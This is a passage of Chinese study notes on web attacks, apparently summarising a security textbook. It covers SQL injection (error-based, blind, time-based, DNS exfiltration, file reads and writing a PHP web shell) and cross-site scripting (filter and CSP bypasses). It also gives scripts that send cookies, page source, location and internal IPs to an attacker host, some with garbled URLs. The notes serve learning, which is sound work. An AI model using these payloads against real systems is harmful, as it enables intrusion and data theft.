concat(0x7e,version(),0x7e))`，这是内层的子查询，也就是嵌套在外层查询中的子查询。它的作用是生成一个字符串，该字符串是数据库版本信息（`version()`）前后加上波浪号（`0x7e`）的结果。\n\n整个 SQL 注入语句的目的是通过嵌套的子查询来生成一个包含数据库版本信息的字符串，并将这个字符串作为一个列（column）返回给外层的查询。在嵌套的子查询中，使用了 `concat` 函数来连接字符串，得到的结果类似于 `~version~`，其中 `~` 是波浪号的表示。由于这个查询是恶意的，并且尝试利用 SQL 注入漏洞来执行非法操作，它使用了嵌套子查询的方式，通过外层子查询来返回内层子查询的结果，从而构造出恶意的SQL语句。这样做的目的是为了绕过应用程序的安全检测，执行恶意的数据库查询。\n\n###### 爆破当前用户\n\n```sql\n1' and(select 1 from (select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n```\n\n###### 爆破当前使用的数据库\n\n```sql\n1' and(select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n```\n\n`a` 是一个子查询的别名\n\n###### 爆破指定表的字段\n\n```sql\n1' and(select 1 from (select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n```\n\n##### exp\n\n当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误\n\n可以用 `~` 运算符按位取反的方式得到一个最大值\n\n除了 exp() 之外，还有类似 pow() 之类的相似函数同样是可利用的，他们的原理相同。\n\n###### 爆破表名\n\n```sql\nselect exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x));\n```\n\n###### 爆破列名\n\n```sql\nselect exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='users')x));\n```\n\n###### 爆破数据\n\n```sql\nselect exp(~ (select*from(select group_concat(id, 0x7c, username, 0x7c, password) from users)x));\n```\n\n###### 读取文件\n\n```sql\nselect exp(~(select * from(select load_file('/etc/passwd'))x));\n```\n\n#### BOOL盲注\n\n应用界面仅仅返回True（页面）或者False（页面）。无法根据应用程序的返回页面得到需要的数据库信息。可以通过构造逻辑判断（比较大小）来得到需要的信息。\n\n一般是逐位确认\n\n1.判断当前数据库名长度与数据库名称\n\n```sql\nand select length(database())>n //判断数据库名长度\nand ascii(substr(database(),m,1))>n //截取数据库名第m个字符并转换成ascii码 判断具体值\n```\n\n2.判断数据库的表长度与表名\n\n```sql\nand length((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1))>n //判断第一行表名的长度\nand ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),m,1))>n //截取第一行表名的第m个字符串转换为ascii值判断具体为多少\n```\n\n3.判断数据库的字段名长度与字段名称\n\n```sql\nand length((select column_name from information_schema.columns where table_name='users' limit 0,1))>n //判断表名中字段名的长度\nand ascii((substr(select column_name from information_schema.columns where table_name='users' limit 0,1),m,1))>n //截取表中字段的第m字符串转换为ascii值，判断具体值\n```\n\n4.判断字段的内容长度与内容字符串\n\n```sql\nand length((select user from users limit 0,1)) >1 //判断字符串内容长度\nand ascii(substr((select user from users limit 0,1),m,1)) //截取第m个字符串转换为ascii值\n```\n\n类似的还有函数`left() right() if() hex()`\n\n#### 时间盲注\n\n和bool盲注类似，只不过是在验证阶段有所不同，bool盲注是根据页面回显的不同来判断的，而时间盲注是根据页面响应时间来判断结果的，常用的函数有：\n\n###### sleep()\n\n常搭配if():\n\n+ if（expr1，expr2，expr3） 如果expr1为真，则if函数执行expr2语句，否则if函数执行expr3语句\n\n```sql\nselect user from users where uer_id=1 and1=if(ascii(substr(database(),1,1))>1,sleep(5),1);\n```\n\n此处 如果条件`ascii(substr(database(),1,1))>1`成立则执行`sleep（5）`，否则执行1\n\n枚举当前数据库名\n\n```sql\n1' and sleep(3) and ascii(substr(database(),m,1))>n --+\n```\n\n枚举当前数据库的表名\n\n```sql\n1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1))>n and sleep(3) --+\n```\n\n或者利用if函数\n\n```sql\n1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit a,1),m,1)) >n,sleep(5),1) --+\n```\n\n枚举当前数据库表的字段名\n\n```sql\n1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit a,1),m,1))>n and sleep(3) --+\n```\n\n枚举每个字段对应的数据项内容\n\n```sql\n1' and ascii(substr((select username from security.users limit a,1),m,1))>n and sleep(3) --+\n```\n\n###### benchmark()\n\nbenchmark(N,expression):N为执行的次数，expression为表达式，比如计算哈希函数MD5，将MD5函数重复次数执行数万次则可以达到延迟的效果\n\n#### dnslog注入：\n\n简单理解就是在利用注入漏洞的时候，页面无回显，无法直接获得回显信息的情况下，目标可以发起DNS请求，这时就可以尝试通过DNSlog注入的方式把想获得的数据外带出来。 对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。\n\n注入主要用到了`Load_file`函数，功能是读取文件并返回文件内容为字符串。(访问互联网中的文件时，需要在最前面加上两个斜杠 //)\n\n使用本函数有几个前提：\n\n1. 首先要有注入点\n\n2. 需要有root权限\n\n3. 数据库有读写权限即：secure_file_priv=“”\n\n4. 得有请求url权限\n\n5. 还必须得是windows服务器\n\n比如这段：\n\n```sql\nselect load_file(concat('//',(select database()),'.je5i3a.dnslog.cn/1.txt'));\n```\n\n首先分析concat，concat作用是组合字符串，后面三个内容会组合到一起，`select database()`会查询到数据库的名称和后面的域名组合到一起，由于组合后相当于是后面域名的子域名，所以会像后面域名请求该域名，后面的域名的服务器就会就会得到dns请求，就可以得到前面的database\n\n#### 宽字节注入\n\n\n\n#### 二次注入\n\n**攻击者构造的恶意数据存储在数据库**后，**恶意数据被读取并进入到SQL查询语句**所导致的注入\n\n两次注入分别是**插入恶意数据**、**利用恶意数据**\n\n看到一个比较简单的例子（比书上的例子好理解www）：\n\n+ 题目场景如下：某网站实现了登录，注册，修改密码功能，我们先进行注册，注册用户名为admin'#，接着修改密码，修改密码需要前密码，猜测sql语句为：`update users set password='$new_pass' where username='$user' and password='$old_pass';`，由于我们的username=admin，则该语句变成：`update users set password='$new_pass' where username='admin'#' and password='$old_pass';`，#号后面的都被注释了\n\n书上的例子：存在用户的登录和注册界面，登录之后可以修改头像，经测试发现只有登录之后会有bool盲注，根据返回长度大小可以判断我们输入的信息是否正确，因此尝试注册不同的用户名，用户名包含bool盲注，如果测试信息成功则说明判断正确\n\n总体思路：写一个脚本，先用随机的pos和payload_chr进行注册，然后登陆界面根据返回长度判断信息是否正确，如果正确则继续注入\n\n(返回第一个数据库)：\n\n```python\nuser='zaaa\\'/**/and/**/ascii(substr((select/**/(schema_name)/**/from/**/information_schema.schemata/**/0,1),%d,1))=%d/**/and/**/\\'1\\'=\\'1'%(pos,ord(payload_chr))\n```\n\n两个%d对应着pos和后面的ord位置，ord()返回对应的 ASCII 数值，pos是针对该数据库名的某一个位置，payload_chr是该数据库某一个位置的ascii码，进行比较，bool盲注，获取返回数据，书上的例子中如果返回正确长度会大于700\n\n#### limit之后的注入\n\n##### 简单介绍limit：\n\n使用查询语句的时候，经常要使用limit返回前几条或者中间某几行数据\n\n```sql\nSELECT * FROM table LIMIT [offset,]\n```\n\nLIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。`LIMIT n` 等价于 `LIMIT(0,n)`,初始记录行的偏移量是 0(而不是 1),比如：\n\n```sql\nSELECT * FROM table LIMIT 5,10;#检索记录行?6-15，从5+1开始算\n```\n\n在上面的bool盲注或者时间盲注中，猜第二个字段把limit 0,1改为limit 1,1  猜第三个字段把limit 0,1改为limit 2,1\n\n##### limit注入\n\n**<u>此方法适用于MySQL 5.x中，在limit语句后面的注入</u>**\n\neg:利用数据库的响应时间来判断数据库的版本号是否是 5 开头:\n\n```sql\nselect * from users where id>1 order by id limit 1,1 procedure analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);\n```\n\n`select * from users where id>1 order by id limit 1,1`：这是一个正常的 SQL 查询语句，它从 users 表中选择所有的列，其中 id 大于 1，并按照 id 升序排序，只返回第二行的结果。\n\n`procedure analyse((select ...),1)`：这是一个 MySQL 的内置函数，它可以分析一个结果集中每一列的数据类型和最优的索引类型，并返回一个新的结果集。它接受两个参数，第一个参数是一个结果集，第二个参数是一个数字，表示要分析的列数。在这里，第一个参数是一个子查询，第二个参数是 1，表示只分析第一列。\n\n`select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1))))`：这是一个子查询，它会随机生成一个 XML 文档，并从中提取出一个值。它可以分为以下几个部分：\n\n+ extractvalue(rand(),concat(...))：这是一个 XML 解析函数，它会从一个 XML 文档中提取出一个值，并返回该值。它接受以下两个参数：\n\n  + `rand()`：这是一个 MySQL 的内置函数，它会返回一个 0 到 1 之间的随机数。作为 XML 文档的根节点。\n\n  + `concat(0x3a,(IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1)))`：这是一个字符串拼接函数，它会将多个字符串连接起来，并返回一个新的字符串。作为 XML 文档的子节点。它接受以下几个参数：\n    + `0x3a`：这是一个十六进制数，表示冒号（:）字符。\n      + `IF(MID(version(),1,1) like 5,BENCHMARK(5000000,SHA1(1)),1)`：这是一个条件判断函数，它会根据一个条件返回两个不同的值。它接受以下几个参数：\n        + `MID(version(),1,1) like 5`：这是一个字符串匹配函数，它会检查数据库的版本号（version()）的第一个字符是否等于 5。\n        + `BENCHMARK(5000000,SHA1(1))`：这是一个耗时操作，它会对 1 进行 5000000 次 SHA1 哈希运算，并返回运算次数。\n        + 如果条件成立（版本号以 5 开头），那么返回 BENCHMARK 的结果（5000000）；如果条件不成立（版本号不以 5 开头），那么返回 1。\n\n#### 注入点的位置及发现\n\n##### 常见的注入点位置\n\n###### GET参数中的注入\n\n可用sqlmap或者手工注入验证\n\n###### POST中的注入\n\n一般需要结合burpsuite抓包，可用sqlmap or 手工注入\n\n###### User-Agent中的注入\n\nburp的repeater或者sqlmap(level=3)\n\n###### Cookies中的注入\n\nburp的repeater或者sqlmap(level=2)\n\n##### 判断注入点是否存在\n\n+ 插入单引号\n\n+ 数字型判断\n\n  通过`and 1=1`（数字型）和`'and '1'='1`（字符型）\n\n+ 通过数字的加减进行判断\n\n  ?id=3-1\n\n#### 绕过\n\n[绕过总结](https://blog.csdn.net/devil8123665/article/details/108746947)\n\n##### 过滤关键字\n\n+ 若没有进行递归过滤，可以使用穿插关键字方法进行绕过\n  + eg：select——selselectect\n  + or——oorr\n+ 大小写绕过\n  + eg：select——SeleCt\n  + or——Or\n+ 有些时候过滤函数是通过16进制进行过滤的，可以对关键字的个别字母进行替换\n  + eg：select——selec\\x74\n+ 通过双重url编码进行绕过\n  + from——%25%36%36%25%36%66%25%37%32%25%36%64\n+ ……\n\n##### 过滤空格\n\n+ 通过注释绕过\n\n  + eg:#  --  //  /**/  ;%00\n\n+ 通过url编码绕过，我们知道空格的编码是%20，可以通过二次url编码绕过\n\n  + %20  ——  %2520\n\n+ 通过空白字符绕过\n\n  + eg：用换行符替代空格\n\n+ 通过特殊符号（如反引号、加号等）\n\n  + ```sql\n    select`user`,`password`from\n    ```\n\n    在不同的场景下，加号减号感叹号也会有同样的效果\n\n+ 科学计数法绕过\n\n  + ```sql\n    select user,password from users where user_id=0e1union select 1,2\n    ```\n\n##### 过滤单引号\n\n##### 绕过相等过滤\n\n##### 分析\n\n```sql\nid=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#\n```\n\n  `/*!UnIoN*/`：这是一个 MySQL 的注释符号，它表示注释掉中间的内容。但是如果中间的内容是一个 MySQL 的关键字（如 UNION ），那么它会被执行。这样做的目的是绕过一些对 UNION 关键字的过滤或防护机制\n\n `/*! ... */`：这是一个条件注释符号，它表示如果中间的内容是一个 MySQL 的关键字（如 UNION ），那么它会被执行；如果中间的内容不是一个 MySQL 的关键字（如 table_name ），那么它会被忽略。这样做的目的是绕过一些对 MySQL 关键字的过滤或防护机制，或者兼容不同版本的 MySQL 。\n\n#### sql读写文件\n\nsql读文件：eg：\n\n```sql\n?id=-1 union select load_file('/etc/host')\n如果要绕过单引号：\n?id=-1 union select load_file(0x2f6574632f686f737473)\n```\n\nsql写文件：eg：\n\n```sql\n?id=-1 union select '<?php eval($_POST[233]);?>' into outfile '/var/www/html/shell.php'\n```\n\n或者\n\n```sql\n?id=-1 union select unhex(一句话的shell) into dumpfile '/var/www/html/shell.php'\n```\n\n## 第三章 跨站脚本攻击\n\n[学习指南](https://zhuanlan.zhihu.com/p/600472299)\n\nDOM介绍：\n\n+ DOM 节点是指在 DOM 树中的对象，用于表示文档中的元素、属性、文本等内容。\n+ DOM 是 Document Object Model 的缩写，用于操作 HTML 或 XML 文档的接口，将文档视为树形结构，每个节点都是对象，可通过编程语言访问和修改属性与内容。\n+ 常见的 DOM 节点类型包括文档节点、元素节点、属性节点、文本节点、注释节点。\n  + 文档节点表示整个文档，是 DOM 树的根节点。\n  + 元素节点表示 HTML 或 XML 中的元素，可包含其他类型的节点。\n  + 属性节点表示元素节点的属性，存储在元素的 attributes 属性中。\n  + 文本节点表示元素或属性中的文本内容，不能包含子节点。\n  + 注释节点表示文档中的注释，不能包含子节点。\n+ 示例 HTML 文档对应的 DOM 树中的节点关系。\n+ 每个 HTML 成分对应 DOM 树中的节点，例如 <html> 元素是文档节点的子节点，<title> 元素是 <head> 元素的子节点等。\n\n### 常见xss漏洞分类\n\n#### 反射型XSS\n\nxss代码作为客户端输入的内容提交到服务端，服务端解析后，在响应内容中返回输入的xss代码，最终由浏览器解释执行\n\n#### 存储型xss\n\n和反射型xss的区别主要在于提交的xss代码是否会存储在服务器端，比如，攻击者发布了一篇文章，包含了恶意xss语句，但是文章内容会被存到数据库中，其他用户点击该文章的时候，会从数据库中读取该文章的内容，浏览器就会对包含恶意代码的响应进行解析执行\n\n#### DOM xss\n\n触发XSS的是浏览器端的DOM解析，没有服务器端的直接参与\n\n比如源代码：\n\n```html\n<html>\n    <head>\n        <title>DOM XSS</title>\n        <meta charset=\"utf-8\">\n    </head>\n    <body>\n        <div id=\"area\">\n            \n        </div>\n        <script>\n            document.getElementById(\"area\").innerHTML=unescape(location.hash);\n        </script>\n    </body>\n</html>\n```\n\n代码中服务端未做任何操作，而客户端的js代码动态的将location.hash给了id为area的div，也就是我们输入网址：\n\n```\nhttp://example.com/dom.heml#<img src=x onerror='alert(/xss/)'>\n```\n\n`#<img src=x onerror='alert(/xss/)'>`会被放到div里面执行，由于x照片找不到，会执行我们的alert\n\n#### 输出在HTML标签里\n\n关键：**<u>闭合</u>**\n\neg源代码：\n\n```html\n<input name=\"user\" value=\"{{your input}}\"/>\n```\n\n这时候输入`#\" onclick=\"alert(/xss/)`,或者输入`#\"><script>alert(/xss/)</script>\"`\n\n#### 输出在CSS代码里\n\neg源代码：\n\n```css\n<style type=\"text/css\">\nbody{\n    color={{your input}};\n}\n```\n\n输入：`#000;background-image:url('javascript:alert(/xss)')`\n\n#### 输出在javascrit代码中\n\neg源代码：\n\n```javascript\n<script>\n    var name='{{your input}}';\n</script>\n```\n\n输入：`'+alert(/xss/)+'`\n\n### 防护与绕过\n\n#### 特定标签过滤\n\n比如过滤掉script，但是任何一种标签，无论是否合法都可以构造出xss代码，比如：\n\n```html\n<not_real_tag onclick=\"alert(/xss/)\">click me</not_real_tag>\n```\n\n#### 事件过滤\n\n比如过滤掉onclick,这时候就需要对所有可利用的事件属性进行遍历，测试开发者是否有遗漏，测试时可用burp或自行编写脚本进行爆破，另外还有一些标签属性本身不属于事件属性，但可用于执行javascript代码，比如常见的javascript伪协议：\n\n```html\n<a href=\"javascript:alert(/xss/)\">click me</a>\n```\n\n#### 敏感关键字（字符）过滤\n\n针对敏感变量或函数，比如：cookie、eval，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过\n\n##### 字符串拼接与混淆\n\n要点：**javascript中的对象方法可通过数组的方式进行调用**\n\n如调用alert函数，可以使用如下方法：\n\n```javascript\nwindow['alert'](/xss/);\n进一步：\nwindow['al'+'ert'](/xss/)\n进一步：\nwindow[atob(\"YWxl\"+\"cnQ=\")](/xss/)\n```\n\nbtoa会把字符串编码为base64，atob会把base64还原为字符串，alert的base64编码为YWxlcnQ=\n\n##### 编码解码\n\n通过各种编码实现xss注入\n\n编码工具：\n\n[XSSEE](https://evilcos.me/lab/xssee/)\n\n##### location.*、window.name\n\nXSS有多种类型，其中一种是DOM-based XSS，也叫客户端XSS。这种类型的XSS是由于网页中的JavaScript代码从一个可控制的源（如URL、Cookie、本地存储等）获取数据，并将其传递给一个支持动态代码执行的汇（如eval()、innerHTML等）。这样就可以让攻击者在目标网页上执行任意的JavaScript代码。\n\nwindow.name和location.*是两个常见的DOM-based XSS的源，它们分别表示浏览器窗口的名称和当前网页的URL。攻击者可以通过修改这两个源中的数据，向目标网页中注入恶意的JavaScript代码片段。\n\n避免开发者对输入的敏感关键字过滤，将xss代码防止与其他不被浏览器提交到服务器端的部分，比如`location.*`、`window.name`等处，`location.*`的构造如下:\n\n```url\nhttp://example.com/xss.php?input=<input onfocus=outerHTML=decodeURI(location.hash)>#<img src=x onerror=alert(/xss/)>\n```\n\n `onfocus`：这是一个事件属性，它指定了当用户将鼠标光标移动到链接上时要执行的 JavaScript 代码。在这里，要执行的代码是 `outerHTML=decodeURI(location.hash)` ，其中：\n\n•  `outerHTML`：这是一个属性，它表示当前元素（即超链接标签）的 HTML 代码。\n\n•  `decodeURI`：这是一个函数，它用于将一个编码过的 URI（统一资源标识符）转换为正常的字符串。\n\n•  `location.hash`：这是一个属性，它表示当前网页地址中跟在井号（#）后面的部分。\n\n•  `#<img src=x onerror=alert(/xss/)>`：这是一个井号后面跟着的一段 HTML 代码，它用于创建一个图像标签。\n\n这段代码的作用和原理如下：\n\n•  首先，向服务器发送包含恶意 HTML 代码的页面请求或输入域。\n\n•  然后，服务器会将恶意 HTML 代码与正常的网页内容拼接起来，并返回给用户。\n\n•  接着，用户会看到一个指向 PHP 脚本文件并带有查询字符串参数的超链接。\n\n•  然后，当用户将鼠标光标移动到超链接上时，超链接标签会执行 onfocus 事件属性中指定的 JavaScript 代码。\n\n•  接着，**JavaScript 代码会将超链接标签的 HTML 代码替换为当前网页地址中跟在井号后面的部分**，并解码成正常的字符串。\n\n•  然后，用户会看到一个图像标签，并尝试加载图像。\n\n•  接着，由于图像的来源地址是不存在或无效的，图像加载失败，图像标签会执行 onerror 事件属性中指定的 JavaScript 代码。\n\n•  最后，JavaScript 代码会弹出一个对话框，并显示 xss 这个字符串。\n\nwindow.name构造：\n\n攻击者可以使用window.open()函数打开一个新窗口，并在第二个参数中指定window.name的值。然后，目标网页可以使用eval(window.name)或类似的方法来执行window.name中的代码。\n\n```html\n<iframe src=\"http://example.com/xss.php?input%3Cinput%20onfocus=location=window.name%3E\" name=\"javascript:alert(/xss/)\">\n</iframe>\n```\n\n这段代码会创建一个iframe，它指向一个存在DOM-based XSS漏洞的网页，并且在window.name中设置了alert(/xss/)这个代码片段。当用户点击iframe中的输入框时，就会触发onfocus事件，并执行window.name中的代码，从而弹出一个对话框。\n\niframe 标签，它用于创建一个内联框架，嵌入另一个网页或资源\n\nsrc：这是一个属性，它指定了 iframe 的来源地址\n\n?input<input onfocus=location=window.name>：这是一个查询字符串，它用于传递一个参数给 PHP 脚本文件。在这里，参数名是 input ，参数值是 <input onfocus=location=window.name> ，这是一个 HTML 标签，它用于创建一个输入域，并指定了当用户将鼠标光标移动到输入域上时要执行的 JavaScript 代码\n\n##### 过滤\".\"\n\n用with：\n\n```\nwith(document)alert(cookie)\n```\n\n##### 过滤\"()\"\n\n用throw：\n\nwindow.onerroe=alert;throw 1;\n\n##### 过滤空格\n\n可以用换行符0x09 0x10 0x12 0x13 0x0a等字符代替空格，在标签名称和第一个属性之间也可以用\"/\"来代替空格：\n\n```html\n<input/onfocus=alert(/xss/)>\n```\n\n##### svg标签\n\n#### 字符集编码导致的绕过\n\n该类方法是通过字符集编码更换以绕过输出检查等\n\n#### 长度限制\n\n可以将要插入的恶意代码放置在window.name或者location.*里，或者使用注释\n\n```html\n<iframe src=\"http://example.com/xss.php?input=%3cinput%20onfocus=eval(window.name)%3E\" name=\"alert(/xss/)\"></iframe>\n```\n\n#### httponly绕过\n\n设置后可以在XSS漏洞发生时避免javascript读取到cookie\n\n##### CVE-2012-0053\n\napache服务器爆出的漏洞，可以向网站植入超大的cookie，使得返回404，包含了cookie\n\n##### PHPINFO页面\n\n该页面会输出当前请求上下文的Cookie信息\n\n##### Flash/java\n\n通过Flash，java的一些API可以获取到cookie\n\n#### XSS Auditor绕过\n\n会检查输入的内容，但是可以通过字符集编码绕过，或者CRLF绕过：浏览器的XSS Auditor是默认打开的，但是如果HTTP响应头中的X-XSS-Protection属性被设置为0，就会关闭，在HTTP响应头中输入CRLF——X-XSS-Protection：0\n\n#### 内容安全策略（CSP）绕过\n\n以白名单的机制来管理网站要加载或执行的资源，但是CSP并不能防止数据泄露\n\n##### CSP配置错误\n\n##### unsafe-inline下的绕过\n\n+ DNS Prefetch:由于link标签最新的rel属性dns-prefetch尚未被加入到csp实现中，可以利用\n\n  ```c++\n  <link rel=\"dns-prefetch\" href=\"[cookie].evil.com\">\n  ```\n\n+ location.href:大部分的网站还是要依赖前端进行跳转，可利用\n\n##### 严苛规则 script-src 'self'下的绕过\n\n将script-src设置为某个目录，通过该目录的302跳转\n\n##### CRLF导致的绕过\n\n在http响应头中注入`[CRLF][CRLF]`,将CSP头部分割至HTTP响应体中，这样注入的XSS代码便不再受到CSP的影响\n\n### 危害与利用技巧\n\nXSS漏洞可以实现的危害包括但不限于：\n\n+ 窃取用户的cookie信息，伪造用户身份。这是XSS攻击最常见的目的之一，因为cookie通常包含了用户的登录凭证或其他敏感信息。如果攻击者能够获取到用户的cookie，就可以利用它来访问用户的账户或者进行其他恶意操作。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：\n\n  ```html\n  <script>var img = new Image(); img.src = \"6 + document.cookie;</script>\n  ```\n\n  这段代码会创建一个隐藏的图片元素，并将其src属性设置为一个恶意网站的地址，同时将当前页面的cookie作为参数传递过去。如果用户点击了这个链接，浏览器就会执行这段代码，并向恶意网站发送一个请求，从而泄露了用户的cookie信息。攻击者可以在恶意网站上收集这些信息，并利用它们来伪造用户身份。\n\n+ 与浏览器DOM对象进行交互，执行受害者所有可以执行的操作。DOM对象是浏览器中用来表示和操作网页结构和内容的接口。如果攻击者能够通过XSS注入一些JavaScript代码到网页中，就可以利用DOM对象来改变网页的外观和行为，或者执行一些用户本身可以执行的操作。例如，如果一个网站存在存储型XSS漏洞，攻击者可以在留言板上发布一条包含如下代码的留言：\n\n  ```c++\n  <script>document.getElementById(\"submit\").onclick = function() {alert(\"你确定要提交吗？\");};</script>\n  ```\n\n  这段代码会修改提交按钮的点击事件，使得每当用户点击提交按钮时，都会弹出一个提示框。这样就可以干扰用户正常使用网站的功能，或者诱导用户做一些不想做的事情。\n\n+ 获取网页源码。这是XSS攻击中比较简单但也比较有用的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以获取到网页的源码，并将其发送给攻击者。这样就可以窥探网站的内部结构和逻辑，或者发现一些隐藏的信息和功能。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：\n\n  ```html\n  <script>var xhr = new XMLHttpRequest(); xhr.open(\"GET\", window.location.href, true); xhr.onload = function() {var img = new Image(); img.src = \"7 + encodeURIComponent(xhr.responseText);}; xhr.send();</script>\n  ```\n\n  这段代码会创建一个XMLHttpRequest对象，并向当前页面发送一个GET请求。当请求完成后，就会将响应内容（即网页源码）作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将网页源码泄露给攻击者。\n\n+ 发起HTTP请求。这是XSS攻击中非常强大和危险的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用浏览器作为代理，向任何目标发起HTTP请求。这样就可以绕过**同源策略**（Same Origin Policy）(同源策略是浏览器的一种安全机制，它限制了不同源的网页之间的交互。例如，一个网页不能通过JavaScript访问另一个网页的内容，除非它们属于同一个源。源是由协议、域名和端口号组成的，只有当这三个部分完全相同的时候，两个网页才被认为是同源的。这样可以防止恶意网站窃取用户的数据或执行一些有害的操作。同源策略主要针对的是脚本的访问，而不是资源的嵌入。也就是说，你可以在一个网页中使用`<img>`、`<script>`、`<link>`等标签来嵌入不同源的图片、脚本、样式等资源，但是你不能通过XMLHttpRequest或fetch等方法来获取不同源的数据，除非对方网站允许了跨源资源共享（CORS）。CORS是一种协议，它可以让服务器指定哪些网站可以访问它的资源，从而放宽同源策略的限制。\n\n+ )，访问一些受限的资源，或者执行一些需要权限的操作。例如，如果一个网站存在存储型XSS漏洞，攻击者可以在留言板上发布一条包含如下代码的留言：\n\n  ```html\n  <script>var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"8\", true); xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(\"id=123\");</script>\n  ```\n\n  这段代码会创建一个XMLHttpRequest对象，并向一个管理后台的地址发送一个POST请求，试图删除一个id为123的记录。如果用户在浏览这条留言时已经登录了管理后台，那么这个请求就会带上用户的cookie信息，并可能成功执行删除操作。这样就可以利用用户的权限来进行一些恶意的操作。\n\n+ 使用HTML5 Geolocation API获取地理位置信息。这是XSS攻击中利用HTML5新特性的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用Geolocation API来获取用户的地理位置信息，并将其发送给攻击者。这样就可以追踪用户的位置，或者进行一些基于位置的服务或攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：\n\n  ```html\n  <script>if (navigator.geolocation) {navigator.geolocation.getCurrentPosition(function(position) {var img = new Image(); img.src = \"9 + position.coords.latitude + \"&lon=\" + position.coords.longitude;});}</script>\n  ```\n\n  这段代码会检测浏览器是否支持Geolocation API，如果支持，就会调用getCurrentPosition方法来获取用户的当前位置。当获取成功后，就会将位置信息作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将用户的位置信息泄露给攻击者。\n\n+ 使用WebRTC API获取**内网IP地址**。这是XSS攻击中利用WebRTC新特性的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用WebRTC API来获取用户的内网IP地址，并将其发送给攻击者。这样就可以探测用户所在的内网环境，或者进行一些针对内网的攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：\n\n  ```html\n  <script>var pc = new RTCPeerConnection({iceServers: []}); pc.createDataChannel(\"\"); pc.createOffer().then(function(offer) {pc.setLocalDescription(offer)}); pc.onicecandidate = function(event) {if (event && event.candidate && event.candidate.candidate) {var ip = event.candidate.candidate.split(\" \")[4]; var img = new Image(); img.src = \"10 + ip;}}</script>\n  ```\n\n  代码解释：\n\n  + `var pc = new RTCPeerConnection({iceServers: []})`; 这一行创建了一个新的RTCPeerConnection对象，它表示一个WebRTC连接，用于在本地和远程之间传输音视频或数据。参数中的{iceServers: []}表示一个空的ICE服务器列表，ICE是一种用于在网络地址转换（NAT）后面的设备之间建立连接的协议，它需要一些服务器来协助发现和交换候选地址。这里使用空列表是为了只获取内网IP地址，而不考虑公网IP地址。\n  + `pc.createDataChannel(\"\")`; 这一行创建了一个数据通道，它是一种用于在WebRTC连接上传输任意数据的双向通道。参数中的\"\"表示数据通道的标签，用于区分不同的数据通道，这里使用空字符串是为了简化代码。\n\n  + `pc.createOffer().then(function(offer) {pc.setLocalDescription(offer)})`; 这一行创建了一个offer，它是一种用于描述本地设备的音视频或数据能力和配置的对象，它包含了SDP（会话描述协议）格式的信息。创建offer后，就调用pc.setLocalDescription(offer)方法，将offer设置为本地描述，这样就可以开始收集候选地址，并触发onicecandidate事件。\n\n  + `pc.onicecandidate = function(event) {if (event && event.candidate && event.candidate.candidate) {var ip = event.candidate.candidate.split(\" \")[4]; var img = new Image(); img.src = \"10 + ip;}}` 这一行定义了一个函数，用于处理onicecandidate事件，这个事件在每次收集到一个候选地址时都会触发。参数中的event对象包含了一个candidate属性，它是一个RTCIceCandidate对象，表示一个候选地址。如果event.candidate存在，就从中提取出IP地址，它是一个字符串，格式为`\"candidate:1 1 udp 2122260223 192.168.0.1 59713 typ host generation 0\"`，其中第五个空格分隔的部分就是IP地址。然后创建一个隐藏的图片元素，并将其src属性设置为一个恶意网站的地址，同时将IP地址作为参数传递过去。这样就可以利用浏览器向恶意网站发送一个请求，并泄露用户的内网IP地址。\n\n  这段代码会创建一个RTCPeerConnection对象，并设置一个空的ICE服务器列表。然后创建一个数据通道，并生成一个offer。当生成offer后，就会触发onicecandidate事件，从而获取到候选IP地址。如果获取到了内网IP地址，就会将其作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将用户的内网IP地址泄露给攻击者。\n\n+ 